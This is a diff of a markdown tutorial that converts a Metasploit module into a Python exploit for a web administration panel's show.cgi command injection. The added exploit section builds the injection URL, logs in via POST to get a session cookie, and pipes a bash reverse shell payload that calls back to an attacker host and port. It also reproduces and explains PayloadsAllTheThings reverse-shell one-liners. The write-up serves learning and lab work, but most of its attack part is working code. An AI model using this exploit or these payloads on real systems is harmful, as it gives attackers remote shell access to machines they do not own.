@@ -116,9 +116,9 @@ Information to convert
     Rank = ExcellentRanking
 
     include Msf::Exploit::Remote::HttpClient
-  #########################
-  ## Initialize Function ##
-  #########################
+    #########################
+    ## Initialize Function ##
+    #########################
     def initialize(info = {})
       # Description of the Exploit, authaorice and referenc sites 
       super(
@@ -334,7 +334,7 @@ Main Effort: Enable python to execute the system shell `/bin/sh` or `/bin/bash`.
 
 #### Selected Payload  
 
-  `payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"`
+`payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"`
 
 Conversion Requirement Met: payload type: cmd or system shell
 
@@ -348,17 +348,17 @@ POST requests in python can send data to a server via a dictionary, list of tupl
 We only need three items to send as data: the page, username, and password.  
 From the developer tools we know the exact labels of each of these; page, user, and pass.
 
-  `data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}`
+`data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}`
 
 We can include a variable with the file to target using f-strings.  
 We know the receiving port is the default port 80 so we don't need to include it manually.
 
-  `url = f"http://{targetIP}/session_login.cgi"`
+`url = f"http://{targetIP}/session_login.cgi"`
 
 Now we have all of the information we need to login via POST request.  
 We'll be sending the credentials, the test cookie with its value, as well as ignoring TLS and site redirects.
 
-  `r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)`
+`r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)`
 
 Next we can include the if statement.  
 We can check the status code and verify the cookies aren't empty using methods from the requests module.
@@ -403,7 +403,98 @@ We've now completed the login section of our exploit.
 
 ### Exploit
 
+Write functions to generate five random alphanumeric characters stored in a string  and a payload which opens the shell via bash and captures the output to send via a GET or POST request.  
 
+The simplest way to execute the payload would be to replicate the original ruby program by formatting it inside of the URL.  
+This saves space and makes the program clearer by directly piping the invalid character to the payload.  
+In order to do this, we'll have to analyze the type of data we're dealing with.  
+For data to be used in conjunction, it must be of the same type.  
+Our random character and payload functions must both be strings to be formatted in the URL.
+
+`exp = f"http://{targetIP}/file/show.cgi/bin/{rand()}|{payload()}|"`
+
+Using the `string` and `secrets` modules we're able to make a function that randomly prints five alphanumeric character.  
+The strings library does not have a native alphanumeric method, so I had to combine methods representing single digits and all cases alphabet letters.
+
+```python
+alphaNum = string.ascii_letters + string.digits 
+```
+
+We can then input this variable to be randomly generated with five characters  
+
+```python
+randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
+```
+
+```python
+
+import string
+import secrets
+def rand():
+  alphaNum = string.ascii_letters + string.digits
+  randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
+  return randChar
+
+for i in range(1,20):
+  print(rand())
+```
+And we have our invalid input function.
+
+#### payload()
+
+There are numerous ways to execute the system shell on Linux as we have the freedom to execute any command that we want.  
+In this scenario we will save steps and space by using bash to open a connection to the attacker and send the shell.  
+
+PayloadsAllTheThings lists the following examples:
+
+`bash -i` is a popular one line command to establish an interactive reverse shell on a system
+
+```bash
+bash -i >& dev/tcp/10.0.0.1/4242 0>&1  
+0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
+```
+
+
+`bash -i` : Initiate the interactive shell, allowing for both inputs and outputs in the same terminal  
+`/dev/tcp/10.0.0.1/4242` : special file in linux which permits creation of a network connection, to the given IP and port.  
+`>& /dev/tcp/10.0.0.1/4242` : redirects `stdout` and `stderr` to the tcp connection
+`0>&1` : Redirects file descriptor 0 (stdin) to where file descriptor 1 (stdout) is pointing, allowing input for the shell to come from the same place as the output, further allowing the user to interact iwth the shell remotely.  
+`0<&196;` : Redirects stdin (file descriptor 0) to the custom file descriptor 196.
+`exec 196<>/dev/tcp/10.0.0.1/4242;` Creates the connection to the TCP service again, but this time opening descriptor 196 for both reading and writing (<> means open for read/write).  
+`sh <&196`  : This starts a new shell (sh) using the input coming from file descriptor 196, which is our TCP connection.  
+`>&196 2>&196` : This portion passes both standard output and standard error to the connection using the same file descriptor 196.
+
+***File Descriptors***  
+abstract representation of open files and input/output (I/O) resources.  
+a small integer that uniquely identifies an open file (or other I/O resource) within a process.  
+Each process has its own set of file descriptors, allowing multiple processes to open the same file without conflict.  
+Each process maintains a file descriptor table, storing all open file descriptors associated with its open files  
+
+    0 - Standard Input (stdin): Used for reading input (usually from the keyboard).
+    1 - Standard Output (stdout): Used for writing output (usually to the terminal).
+    2 - Standard Error (stderr): Used for writing error messages (also usually to the terminal).
+
+While it executes a reverse shell, we are missing a key point. 
+Without specifying what to do with the bash shell that executes on boot, the system is unable to distinguish between separate processes of bash.  
+To fix this, we can use 
+
+`:> bash -c 'exec bash -i xyz'`
+
+`exec` completely replaces the current running process.  
+The current shell process is destroyed and entirely replaced by the command we specify which will be the reverse shell:  
+`bash -i &>/dev/tcp/TARGET_IP/PORT`
+
+`payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"`  
+
+Lastly, all we need is the second request with the authenticated cookie.  
+The module did not specify whether to use a POST or GET method however, in this scenario either method works.
+
+`req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)`
+
+Conversion Requirements Met:
+  generate five random alphanumeric characters
+  store the system shell with a function, encode it and send it back via socket
+  send a GET or POST request with compromised cookie to show.cgi with invalid input piping it to the malicious command  
 
 ## Final Exploit and Test
 
